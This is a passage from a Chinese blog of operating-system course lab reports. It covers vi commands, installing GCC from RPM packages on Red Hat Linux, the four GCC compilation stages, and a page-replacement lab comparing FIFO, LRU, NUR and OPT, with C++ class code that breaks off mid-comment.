<td>从第一行到最后一行寻找   word1 字符串，并将该字符串取代为 word2 ，且在取代前显示提示字符给用户确认 (confirm) 是否需要取代</td>
</tr>
</tbody></table>
</li>
<li><p>命令模式切换到插入模式的可用的按钮</p>
<table>
<thead>
<tr>
<th>命令</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>I，i</td>
<td>进入插入模式(Insert   mode)：    i 为『从目前光标所在处输入』；    I 为『在目前所在行的第一个非空格符处开始输入』</td>
</tr>
<tr>
<td>A，a</td>
<td>进入插入模式(Insert   mode)：    a 为『从目前光标所在的下一个字符处开始输入』；     A 为『从光标所在行的最后一个字符处开始输入』</td>
</tr>
<tr>
<td>O，o</td>
<td>进入插入模式(Insert   mode)：    o 为『在目前光标所在的下一行处输入新的一行』；    O 为在目前光标所在处的上一行输入新的一行</td>
</tr>
<tr>
<td>R，r</td>
<td>进入取代模式(Replace mode)：   r 只会取代光标所在的那一个字符一次；    R会一直取代光标所在的文字，直到按下 ESC 为止；</td>
</tr>
<tr>
<td>vi 画面的左下角处会出现『–INSERT–』或『–REPLACE–』的字样，一定要在左下角处看到 INSERT 或 REPLACE 才能输入字符</td>
<td></td>
</tr>
<tr>
<td>[Esc]</td>
<td>退出编辑模式，回到命令模式中</td>
</tr>
</tbody></table>
</li>
<li><p>末行模式切换到指令行模式的可用的按钮</p>
<table>
<thead>
<tr>
<th>命令</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>:w</td>
<td>保存文件</td>
</tr>
<tr>
<td>:w!</td>
<td>若文件属性为『只读』时，强制写入保存文件</td>
</tr>
<tr>
<td>:q</td>
<td>退出vi</td>
</tr>
<tr>
<td>:q!</td>
<td>强制退出</td>
</tr>
<tr>
<td>:wq</td>
<td>保存并退出</td>
</tr>
<tr>
<td>ZZ</td>
<td>文件没有更动，则不储存离开，若文件已经被更动过，则储存后离开</td>
</tr>
<tr>
<td>:w [filename]</td>
<td>编辑的数据另存为filename</td>
</tr>
<tr>
<td>:r [filename]</td>
<td>编辑的数据中，读入另一个filename</td>
</tr>
<tr>
<td>:n1,n2 w [filename]</td>
<td>将 n1 到 n2 的内容储存成 filename</td>
</tr>
<tr>
<td>:! Command</td>
<td>暂时离开 vi 到指令行模式下执行 command 的显示结果</td>
</tr>
<tr>
<td>:set nu</td>
<td>显示行号，设定之后，会在每一行的前缀显示该行的行号</td>
</tr>
<tr>
<td>:set nonu</td>
<td>取消行号</td>
</tr>
</tbody></table>
</li>
</ol>
</li>
</ol>
<h2 id="安装Linux的编译器GCC"><a href="#安装Linux的编译器GCC" class="headerlink" title="安装Linux的编译器GCC"></a>安装<code>Linux</code>的编译器<code>GCC</code></h2><ol>
<li><p>打开<code>Linux</code>终端，输入命令如下，发现已经安装<code>gcc</code>；</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc –version</span><br></pre></td></tr></table></figure>

<p> <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image252.jpg" alt="img"></p>
</li>
<li><p>在终端输入命令如下，卸载<code>gcc</code>；</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum remove gcc --skip -broken</span><br></pre></td></tr></table></figure>

<p> <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image254.jpg" alt="img"></p>
</li>
<li><p>下载安装<code>gcc</code>、<code>g++</code>的必要<code>rpm</code>包</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="string">binutils-2.20.51.0.2-5.36.el6.x86_64.rpm</span></span><br><span class="line"><span class="string">cloog-ppl-0.15.7-1.2.el6.x86_64.rpm</span></span><br><span class="line"><span class="string">cpp-4.4.7-3.el6.x86_64.rpm</span></span><br><span class="line"><span class="string">gcc-4.4.7-3.el6.x86_64.rpm</span></span><br><span class="line"><span class="string">gcc-c++-4.4.7-3.el6.x86_64.rpm</span></span><br><span class="line"><span class="string">glibc-devel-2.12-1.107.el6.x86_64.rpm</span></span><br><span class="line"><span class="string">glibc-headers-2.12-1.107.el6.x86_64.rpm</span></span><br><span class="line"><span class="string">kernel-headers-2.6.32-358.el6.x86_64.rpm</span></span><br><span class="line"><span class="string">libstdc++-devel-4.4.7-3.el6.x86_64.rpm</span></span><br><span class="line"><span class="string">mpfr-2.4.1-6.el6.x86_64.rpm</span></span><br><span class="line"><span class="string">ppl-0.10.2-11.el6.x86_64.rpm</span></span><br></pre></td></tr></table></figure>

<p> <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image256.jpg" alt="img"></p>
</li>
<li><p>在终端输入命令如下，安装上述安装包；</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">rpm -ivh (rpm包名称)</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\Levi\AppData\Roaming\Typora\typora-user-images\1569573078991.png" alt="1569573078991"></p>
</li>
<li><p>在终端输入如下命令，查看<code>gcc</code>版本为<code>4.4.7</code>，安装成功</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc --version</span><br><span class="line">g++ --version</span><br></pre></td></tr></table></figure>

<p> <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image260.jpg" alt="img"></p>
</li>
</ol>
<h2 id="熟悉使用GCC编译环境"><a href="#熟悉使用GCC编译环境" class="headerlink" title="熟悉使用GCC编译环境"></a>熟悉使用GCC编译环境</h2><ol>
<li><p><code>gcc</code>编译的四个步骤</p>
<ol>
<li><p>预处理</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc -o mine.i mine.c -E</span><br><span class="line">*.c --&gt; *.i</span><br></pre></td></tr></table></figure>

<p>主要是把头文件展开，完成函数或结构体等的声明;</p>
</li>
<li><p>编译</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc -o mine.s mine.i -S</span><br><span class="line">*.i --&gt; *.s</span><br></pre></td></tr></table></figure>

<p>主要是把c源码文件翻译成汇编文件;</p>
</li>
<li><p>汇编</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc -o mine.o mine.s -c</span><br><span class="line">*.s --&gt; *.o</span><br></pre></td></tr></table></figure>

<p>主要是把汇编文件翻译成二进制的目标文件;</p>
</li>
<li><p>链接</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">*.o --&gt; *.bin</span><br></pre></td></tr></table></figure>

<p>把所有的目标文件添加上和系统对接的代码，最后生成可执行程序;</p>
</li>
</ol>
<p>编译总过程为</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc -o ****.i  ****.c -E</span><br><span class="line">gcc -o ****.s  ****.i -S</span><br><span class="line">gcc -o ****.o  ****.s -c</span><br><span class="line">gcc -o ****.bin  ****.o</span><br></pre></td></tr></table></figure></li>
<li><p>新建<code>mine.c</code>文件，编写代码如下</p>
</li>
</ol>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image262.jpg" alt="img"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image264.jpg" alt="img"></p>
<h1 id="实验关键里程碑数据与结果"><a href="#实验关键里程碑数据与结果" class="headerlink" title="实验关键里程碑数据与结果"></a>实验关键里程碑数据与结果</h1><ol>
<li>安装<code>red hat linux</code>分区和选取服务</li>
</ol>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image265.jpg" alt="img"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image266.jpg" alt="img"></p>
<ol start="2">
<li><p>熟悉<code>Linux</code>文件目录的用途</p>
<p><img src="C:\Users\Levi\AppData\Roaming\Typora\typora-user-images\1569484636627.png" alt="1569484636627"></p>
</li>
<li><p>熟悉常用命令，<code>mount</code>较难理解</p>
</li>
</ol>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image268.jpg" alt="img"></p>
<ol start="4">
<li><p><code>GCC</code>使用，了解编译过程如下</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc -o mine.i  mine.c -E</span><br><span class="line">gcc -o mine.s  mine.i -S</span><br><span class="line">gcc -o mine.o  mine.s -c</span><br><span class="line">gcc -o mine.bin  mine.o</span><br></pre></td></tr></table></figure></li>
</ol>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image262.jpg" alt="img"></p>
<h1 id="实验难点与收获"><a href="#实验难点与收获" class="headerlink" title="实验难点与收获"></a>实验难点与收获</h1><h2 id="难点"><a href="#难点" class="headerlink" title="难点"></a>难点</h2><ol>
<li>安装磁盘时，分区与挂载过程中操作复杂，理解困难；</li>
<li><code>usr</code>目录和根目录名称相同的目录代表的意义不相同；</li>
<li><code>gcc</code>安装与配置需要的<code>rpm</code>包比较多，容易漏装；</li>
</ol>
<h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><ol>
<li>之前<code>VMware</code>安装虚拟机，一直使用简易安装，这次学会了使用自定义安装虚拟机；</li>
<li>熟悉了<code>linux</code>基本命令，基本学会使用命令行，思维从图形化界面到命令行有了一定的转换；</li>
<li>对<code>Linux</code>目录结构有了一定的了解，与<code>windows</code>目录结构有一定的区别；</li>
<li>基本学会使用<code>vi</code>编辑器；</li>
<li>了解了<code>linux</code>中<code>GCC</code>编译执行<code>c</code>语言文件的过程；</li>
</ol>
<h1 id="实验思考"><a href="#实验思考" class="headerlink" title="实验思考"></a>实验思考</h1><p>该实验主要目的是熟悉<code>linux</code>虚拟机安装、目录结构、基本命令、<code>GCC</code>使用。实验内容相对基础，但是比较繁琐，尤其是熟悉基本命令，觉得可以适当精简；实验整体思路符合逻辑。</p>
]]></content>
      <categories>
        <category>操作系统内核实验</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>操作系统内核-实验三</title>
    <url>/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%86%85%E6%A0%B8-%E5%AE%9E%E9%AA%8C%E4%B8%89.html</url>
    <content><![CDATA[<h1 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h1><ol>
<li>理解内存页面调度的机理；</li>
<li>掌握几种理论调度算法实现；</li>
<li>通过实验比较各种调度算法的优劣；</li>
<li>通过实验了解HASH表数据结构的使用；<span id="more"></span></li>
</ol>
<h1 id="准备知识"><a href="#准备知识" class="headerlink" title="准备知识"></a>准备知识</h1><ol>
<li><p>C++、指针和结构体(类)</p>
</li>
<li><p>哈希表查找方式</p>
</li>
<li><p>操作系统内存交换的知识</p>
</li>
<li><p>可能用到的几个函数</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">getpid</span> <span class="params">()</span>		<span class="comment">//获得当前进程的pid</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">srand</span> <span class="params">(<span class="type">int</span> a)</span>	<span class="comment">//以a为种子产生随机数</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">rand</span> <span class="params">()</span>			<span class="comment">//根据前面的种子，返回一个随机数  </span></span></span><br></pre></td></tr></table></figure></li>
</ol>
<h1 id="实验内容"><a href="#实验内容" class="headerlink" title="实验内容"></a>实验内容</h1><p>对比以下几种页面置换算法的命中率</p>
<ol>
<li>先进先出的算法FIFO(First In First Out)</li>
<li>最近最少使用的算法LRU(Least Recently Used)</li>
<li>最近未使用算法NUR(Never Recently Used)</li>
<li>最佳置换算法OPT(Optimal Replacement)</li>
</ol>
<h1 id="页面置换算法介绍"><a href="#页面置换算法介绍" class="headerlink" title="页面置换算法介绍"></a>页面置换算法介绍</h1><h2 id="FIFO页面置换算法"><a href="#FIFO页面置换算法" class="headerlink" title="FIFO页面置换算法"></a>FIFO页面置换算法</h2><h3 id="原理简述"><a href="#原理简述" class="headerlink" title="原理简述"></a>原理简述</h3><ol>
<li>在分配内存页面数(AP)小于进程页面数(PP)时，最先的AP个页面放入内存；</li>
<li>需要处理新页面时，将原来在内存中的AP个页面中最先进入的调出，放入新的页面；</li>
<li>算法特点：使用内存页面构成一个队列；</li>
</ol>
<h3 id="图表描述"><a href="#图表描述" class="headerlink" title="图表描述"></a>图表描述</h3><ul>
<li><p>假设某个进程在硬盘上被划分为5个页面(PP=5)，以<code>1、2、3、4、5</code>分别表示，处理机调用它们的顺序为：<code>1、4、2、5、3、3、2、4、2、5</code>；</p>
</li>
<li><p>假设内存控制的页面数为3(AP=3)，那么在FIFO算法时，这3个页面的内存使用情况如下图所示 </p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1571155503183.png" alt="1571155503183"></p>
</li>
<li><p>共换入页面8次，<code>diseffect=8</code>；</p>
</li>
</ul>
<h3 id="算法实现"><a href="#算法实现" class="headerlink" title="算法实现"></a>算法实现</h3><ul>
<li>要得到命中率，必然要有一个常量<code>total_instruction</code>记录页面总共使用次数；此外需要一个变量记录总共换入页面的次数(需要换出页面，总是因为没有命中而产生的)diseffect，可利用公式得到命中率(公式如下)。<ol>
<li><p>初始化，设置两个数组<code>page[ap]</code>和<code>pagecontrol[pp]</code>分别表示进程页面数和内存分配的页面数，并产生一个的随机数序列<code>main[total_instruction]</code>(当然这个序列由<code>page[]</code>的下标随机构成)，表示待处理的进程页面顺序，diseffect置0；</p>
</li>
<li><p>看<code>main[]</code>中是否有下一个元素，有就由<code>main[]</code>中获取该页面下标，并转到步骤3；若没有，就转到步骤7；</p>
</li>
<li><p>如果该page页已在内存中，就转到步骤2；否则就到步骤4，同时未命中的diseffect加1；</p>
</li>
<li><p>观察pagecontrol是否占满，如果占满需将使用队列(步骤六中建立的)中最先进入的(就是队列第一个单元)pagecontrol单元“清干净”，同时将对应的<code>page[]</code>单元置为“不在内存中”。</p>
</li>
<li><p>将该<code>page[]</code>与<code>pagecontrol[]</code>建立关系(可以改变<code>pagecontrol[]</code>的标示位，也可以采用指针连接。总之，至少要使对应的pagecontrol单元包含两个信息：一是它被使用了，二是哪个<code>page[]</code>单元使用的；<code>page[]</code>单元包含两个信息：对应的pagecontrol单元号、本<code>page[]</code>单元已在内存中)； </p>
</li>
<li><p>将用到的pagecontrol置入使用队列(这里的队列当然是一种先进先出的数据结构)，返回步骤2；</p>
</li>
<li><p>显示命中率(命中率公式如下) ，算法完成。<br>$$<br>hit_-rate=1-\frac{diseffect}{total_-instruction}\times100%<br>$$</p>
</li>
</ol>
</li>
</ul>
<h2 id="LRU页面置换算法"><a href="#LRU页面置换算法" class="headerlink" title="LRU页面置换算法"></a>LRU页面置换算法</h2><h3 id="原理简述-1"><a href="#原理简述-1" class="headerlink" title="原理简述"></a>原理简述</h3><ol>
<li>在分配内存页面数(AP)小于进程页面数(PP)时，最先的AP个页面放入内存；</li>
<li>当需要调入页面进入内，而当前分配的内存页面不空闲时，选择其中最长时间没有用的那个页面调出，以控制内存来放置新调入的页面；</li>
<li>算法特点：每个页面都有属性表示有多长时间未被CPU使用的信息；</li>
</ol>
<h3 id="图表描述-1"><a href="#图表描述-1" class="headerlink" title="图表描述"></a>图表描述</h3><ul>
<li><p>假设某个进程与内存可控制页面数不变：<code>AP=3</code>，<code>PP=5</code>；</p>
</li>
<li><p>处理机调用它们的顺序不变：<code>1、4、2、5、3、3、2、4、2、5</code></p>
</li>
<li><p>使用LRU算法时，这3个页面的内存使用情况如下图所示</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1571062544372.png" alt="1571062544372"></p>
</li>
<li><p>共换入页面7次，<code>diseffect=7</code>；</p>
</li>
</ul>
<h3 id="算法实现-1"><a href="#算法实现-1" class="headerlink" title="算法实现"></a>算法实现</h3><ul>
<li>和FIFO算法相同，只有先得到diseffect才能获得最终“命中率”；<ol>
<li>初始化，主要是进程页面<code>page[]</code>和分配的内存页面<code>pagecontrol[]</code>，同时产生随机序列<code>main[]</code>，diseffect置0；</li>
<li>看序列<code>main[]</code>是否有下一个元素，有就由<code>main[]</code>中获取该页面下标，并转到步骤3；若没有，就转到步骤6；</li>
<li>如果该page页已在内存中，便改变页面属性，使它保留“最近使用”的信息，转到步骤2；否则就到步骤4，同时未命中的diseffect加1；</li>
<li>判断是否有空闲的内存页面，如果有，就返回页指针，转到步骤5；否则在内存页面中找出最长时间没有使用到的页面，将其“清干净”，并返回该页面指针；</li>
<li>在需要处理的<code>page[]</code>与步骤4中得到的<code>pagecontrol[]</code>建立关系，同时让对应的<code>page[]</code>单元保存“最新使用”的信息，返回步骤2； </li>
<li>如果序列处理完成，就输出命中率(命中率公式同上)，算法结束。</li>
</ol>
</li>
</ul>
<h2 id="NUR页面置换算法"><a href="#NUR页面置换算法" class="headerlink" title="NUR页面置换算法"></a>NUR页面置换算法</h2><h3 id="原理简述-2"><a href="#原理简述-2" class="headerlink" title="原理简述"></a>原理简述</h3><ul>
<li>所谓的“最近未使用”首先要对“近”做一个界定，比如<code>CLEAR_PERIOD=50</code>，便是在CPU最近执行的50次进程页面处理工作中，找出这50次都没有处理的页面；<ol>
<li>如果这样的页面只有一个，就将其换出，放入需处理的新页面；</li>
<li>如果有不止一个这样的页面，在这些页面中任取出一个换出，放入需处理的页面；</li>
<li>如果没有这样的页面，则随意换出一个页面(页码可以最大也可以最小)；</li>
</ol>
</li>
<li>算法特点：有一个循环周期，每达到这个周期，所有页面存放是否被CPU处理信息的属性均被置于初始态；</li>
</ul>
<h3 id="图表描述-2"><a href="#图表描述-2" class="headerlink" title="图表描述"></a>图表描述</h3><ul>
<li><p>假设某个进程与内存可控制页面数不变：<code>AP=3，PP=5</code>；</p>
</li>
<li><p>处理机调用它们的顺序不变：<code>1、4、2、5、3、3、2、4、2、5</code>；</p>
</li>
<li><p>使用NUR算法时，这3个页面的内存使用情况如下图所示；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1571157657346.png" alt="1571157657346"></p>
</li>
</ul>
<h3 id="算法实现-2"><a href="#算法实现-2" class="headerlink" title="算法实现"></a>算法实现</h3><p>需要对数组设置“访问位”标识；</p>
<ol>
<li>初始化，设置两个数组<code>page[ap]</code>和<code>pagecontrol[pp]</code>分别表示进程页面数和内存分配的页面数，并产生一个的随机数序列<code>main[total_instruction]</code>（当然这个序列由<code>page[]</code>的下标随机构成），表示待处理的进程页面顺序，diseffect置0，设定循环周期CLEAR_PERIOD；</li>
<li>看<code>main[]</code>中是否有下一个元素，有就从<code>main[]</code>中获得一个CPU将处理页面的序号；没有，就转到步骤8；</li>
<li>如果待处理的页面已在内存中，就转到步骤2；否则diseffect加1，并转到步骤4；</li>
<li>看是否有空闲的内存页面，如果有，返回空闲页面指针，转到步骤5；否则，在所有没有被访问且位于内存中的页面中按任意规则（或者取最近的一个页面；或者取下标最小的页面，等等）取出一个，返回清空后的内存页面指针；</li>
<li>在待处理进程页面与内存页面之间建立联系，并标注该页面被访问；</li>
<li>如果CPU已处理了CLEAR_PERIOD个页面，就将所有页面均设为“未访问”；</li>
<li>返回步骤2；</li>
<li>如果CPU所有处理工作完成，就返回命中率的结果，算法结束。</li>
</ol>
<h2 id="OPT页面置换算法"><a href="#OPT页面置换算法" class="headerlink" title="OPT页面置换算法"></a>OPT页面置换算法</h2><h3 id="原理简述-3"><a href="#原理简述-3" class="headerlink" title="原理简述"></a>原理简述</h3><p>在分配的内存页面占满的情况下，最佳置换算法是一种理想状况下的算法，他要求先遍历所有的CPU待处理的进程页面序列（实际上，由于待处理的页面有取决于先前处理的页面，所有很多情况下不可能得到完整的待处理页面序列。在这个层面上，才说该算法足理想的。)，在这些页面中，如果有已经在内存当中，而不再处理的，就将其换出：如果页面在内存中，并待处理，就取从当前位置算起，最后处理到的页面，将其换出。比如待处理的页面序列号为：</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1571070639492.png" alt="1571070639492"></p>
<p>已经处理了5个页面，那么页面5是第一个待处理的页面：2是第二个；1是第四个；4是第五个；3是第六个。那么页面3就是针对当前位置而言，最后处理到的页面。</p>
<h3 id="图表描述-3"><a href="#图表描述-3" class="headerlink" title="图表描述"></a>图表描述</h3><ul>
<li><p>假设某个进程与内存可控制页面数不变：<code>AP=3，PP=5</code>；</p>
</li>
<li><p>处理机调用它们的顺序不变：<code>1、4、2、5、3、3、2、4、2、5</code></p>
</li>
<li><p>使用OPT算法时，这3个页面的内存使用情况如下图所示；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1571190143264.png" alt="1571190143264"></p>
</li>
<li><p>一共发生了6次页面交换，<code>diseffect=6</code>；</p>
</li>
</ul>
<h3 id="算法实现-3"><a href="#算法实现-3" class="headerlink" title="算法实现"></a>算法实现</h3><ol>
<li>初始化，设置两个数组<code>page[ap]</code>和<code>pagecontrol[pp]</code>分别表示进程页面数和内存分配的页面数，并产生一个的随机数序列<code>main[total_instruction]</code>（当然这个序列由page[]的下标随机构成），表示待处理的进程页面顺序，diseffect置0，然后扫描整个页面访问序列,对<code>vDistance[TOTAL_VP]</code>数组进行赋值，表示该页面将在第几步被处理；</li>
<li>看<code>main[]</code>中是否有下一个元素，有就从<code>main[]</code>中获取一个CPU待处理的页面号；没有，就转到步骤6；</li>
<li>如果该page页已在内存中，就转到步骤2；否则就到步骤4，同时未命中的diseffect加1；</li>
<li>看是否有空闲的内存页面，如果有，就直接返回该页面指针；如果没有，遍历所有未处理的进程页面序列，如果有位于内存中的页面，而以后CPU不再处理，首先将其换出，返回页面指针；如果没有这样的页面，找出CPU最晚处理到的页面，将其换出，返回该内存页面指针；</li>
<li>在内存页面和待处理的进程页面之间建立联系，返回步骤2；</li>
<li>输出命中率，算法结束。（命中率在扫描时完成计算）</li>
</ol>
<h1 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h1><p>数据结构的详细分析在注释中已经标注；</p>
<h2 id="CPage类"><a href="#CPage类" class="headerlink" title="CPage类"></a>CPage类</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">CPage</span>&#123;	<span class="comment">//进程使用的页面</span></span><br><span class="line">	<span class="keyword">public</span>:</span><br><span class="line">		<span class="type">int</span> m_nPageNumber;		<span class="comment">//页号 </span></span><br><span class="line">		<span class="type">int</span>	m_nPageFaceNumber;	<span class="comment">//对应的物理内存页号，初始为INVALID </span></span><br><span class="line">		<span class="type">int</span>	m_nCounter;			<span class="comment">//计数 </span></span><br><span class="line">		<span class="type">int</span>	m_nTime;			<span class="comment">//时间信息 </span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h2 id="CPageControl类"><a href="#CPageControl类" class="headerlink" title="CPageControl类"></a>CPageControl类</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">CPageControl</span>&#123;		<span class="comment">//分配给进程的物理内存页面</span></span><br><span class="line">	<span class="keyword">public</span>:</span><br><span class="line">		<span class="type">int</span> m_nPageNumber;				<span class="comment">//表示物理内存页号（帧号） </span></span><br><span class="line">		<span class="type">int</span> m_nPageFaceNumber;			<span class="comment">//表示物理内存的页号</span></span><br><span class="line">		<span class="keyword">class</span> <span class="title class_">CPageControl</span> * m_pNext;	<span class="comment">//指示下一个页面</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h2 id="CMemory类"><a href="#CMemory类" class="headerlink" title="CMemory类"></a>CMemory类</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">CMemory</span>&#123;</span><br><span class="line">	<span class="keyword">public</span>:</span><br><span class="line">		<span class="built_in">CMemory</span>();	<span class="comment">//构造函数，用来初始化变量</span></span><br><span class="line">    	<span class="comment">//参数nTotal_pf表示分配的内存页面个数</span></span><br><span class="line">		<span class="function"><span class="type">void</span> <span class="title">initialize</span><span class="params">(<span class="type">const</span> <span class="type">int</span> nTotal_pf)</span></span>;	<span class="comment">//初始化函数</span></span><br><span class="line">		<span class="function"><span class="type">void</span> <span class="title">FIFO</span><span class="params">(<span class="type">const</span> <span class="type">int</span> nTotal_pf)</span></span>;</span><br><span class="line">		<span class="function"><span class="type">void</span> <span class="title">LRU</span><span class="params">(<span class="type">const</span> <span class="type">int</span> nTotal_pf)</span></span>;</span><br><span class="line">		<span class="function"><span class="type">void</span> <span class="title">NUR</span><span class="params">(<span class="type">const</span> <span class="type">int</span> nTotal_pf)</span></span>;</span><br><span class="line">		<span class="function"><span class="type">void</span> <span class="title">OPT</span><span class="params">(<span class="type">const</span> <span class="type">int</span> nTotal_pf)</span></span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">private</span>:</span><br><span class="line">		vector&lt;CPage&gt; _vDiscPages;<span class="comment">//进程使用的页向量,包含该进程空间内的所有页 </span></span><br><span class="line">		vector&lt;CPageControl&gt; _vMemoryPages;	<span class="comment">//为进程分配的物理内存页向量</span></span><br><span class="line">		CPageControl *_pFreepf_head;	<span class="comment">//空闲物理页头指针，用于LRU算法 </span></span><br><span class="line">		CPageControl *_pBusypf_head;	<span class="comment">//已使用页面头指针，用于FIFO算法</span></span><br><span class="line">    	CPageControl *_pBusypf_tail;	<span class="comment">//已使用页面尾指针，用于FIFO算法</span></span><br><span class="line">		vector&lt;<span class="type">int</span>&gt; _vMain;		<span class="comment">//_vMain表示某进程随机产生的指令序列</span></span><br><span class="line">    	vector&lt;<span class="type">int</span>&gt; _vPage;		<span class="comment">//_vPage表示待处理指令对应的页号 </span></span><br><span class="line">    	vector&lt;<span class="type">int</span>&gt; _vOffset;	<span class="comment">//_vOffset表示剩余待处理的指令数</span></span><br><span class="line">		<span class="type">int</span> _nDiseffect;	<span class="comment">//换入页面次数，即未命中次数 </span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h2 id="CMemory类的构造函数"><a href="#CMemory类的构造函数" class="headerlink" title="CMemory类的构造函数"></a>CMemory类的构造函数</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">CMemory::<span class="built_in">CMemory</span>():		<span class="comment">//构造函数</span></span><br><span class="line">    _vDiscPages(TOTAL_VP),</span><br><span class="line">	_vMemoryPages(TOTAL_VP),</span><br><span class="line">	_vMain(TOTAL_INSTRUCTION),</span><br><span class="line">	_vPage(TOTAL_INSTRUCTION),</span><br><span class="line">	_vOffset(TOTAL_INSTRUCTION) &#123;</span><br><span class="line">		<span class="type">int</span> S,i,nRand;</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">			通过随机数产生一个指令序列(实际上是指令的逻辑地址序列)，共320条指令。</span></span><br><span class="line"><span class="comment">			指令的地址按下述原则生成：</span></span><br><span class="line"><span class="comment">				A：50%的指令是顺序执行的</span></span><br><span class="line"><span class="comment">				B：25%的指令要实现向前跳转，均匀分布在前地址部分</span></span><br><span class="line"><span class="comment">				C：25%的指令要实现向后跳转，均匀分布在后地址部分</span></span><br><span class="line"><span class="comment">			函数void srand(unsigned seed)；参数seed是rand()的种子，</span></span><br><span class="line"><span class="comment">			用来初始化rand()的起始值。</span></span><br><span class="line"><span class="comment">			由于每次运行时进程号不同，故可用来作为初始化随机数队列的“种子”</span></span><br><span class="line"><span class="comment">		*/</span> </span><br><span class="line">		<span class="built_in">srand</span>(<span class="built_in">getpid</span>()*<span class="number">10</span>);</span><br><span class="line">        <span class="comment">/* 	函数int rand(void)；从srand (seed)中指定的seed开始，</span></span><br><span class="line"><span class="comment">        	返回一个[seed,RAND_MAX（32767）)间的随机整数。 */</span></span><br><span class="line">		nRand=<span class="built_in">rand</span>()%<span class="number">32767</span>; </span><br><span class="line">		S=(<span class="type">float</span>)<span class="number">319</span>*nRand/<span class="number">32767</span>+<span class="number">1</span>;		<span class="comment">//计算第一条指令的地址S </span></span><br><span class="line">		<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;TOTAL_INSTRUCTION;i+=<span class="number">4</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			_vMain[i]=S;	<span class="comment">//地址S存入_Main[i]</span></span><br><span class="line">			_vMain[i+<span class="number">1</span>]=_vMain[i]+<span class="number">1</span>;	<span class="comment">//顺序执行S的下一条指令 </span></span><br><span class="line">            <span class="comment">/* 计算S的一条任意的前地址指令的地址S&#x27;属于[0，S+1],</span></span><br><span class="line"><span class="comment">            并存入_Main[i+2],表示向前跳转 */</span></span><br><span class="line">			nRand=<span class="built_in">rand</span>()%<span class="number">32767</span>;</span><br><span class="line">			_vMain[i+<span class="number">2</span>]=(<span class="type">float</span>)_vMain[i]*nRand/<span class="number">32767</span>;</span><br><span class="line">			_vMain[i+<span class="number">3</span>]=_vMain[i+<span class="number">2</span>]+<span class="number">1</span>;	<span class="comment">//顺序执行S&#x27;下一条指令 </span></span><br><span class="line">            <span class="comment">/* 计算S&#x27;的一条任意的后指令地址S属于[S&#x27;+1,319],表示向后跳转 */</span></span><br><span class="line">			nRand=<span class="built_in">rand</span>()%<span class="number">32767</span>; </span><br><span class="line">			S=(<span class="type">float</span>)nRand*(<span class="number">318</span>-_vMain[i+<span class="number">2</span>])/<span class="number">32767</span>+_vMain[i+<span class="number">2</span>]+<span class="number">2</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">			将指令序列变成页地址流</span></span><br><span class="line"><span class="comment">			页面大小为1K；</span></span><br><span class="line"><span class="comment">			用户内存容量4页到32页；</span></span><br><span class="line"><span class="comment">			用户虚存容量为32K.</span></span><br><span class="line"><span class="comment">			在用户虚存中，按每K存放10条指令排列虚存地址，即320条指令在虚存中的存放方式为：</span></span><br><span class="line"><span class="comment">			第0 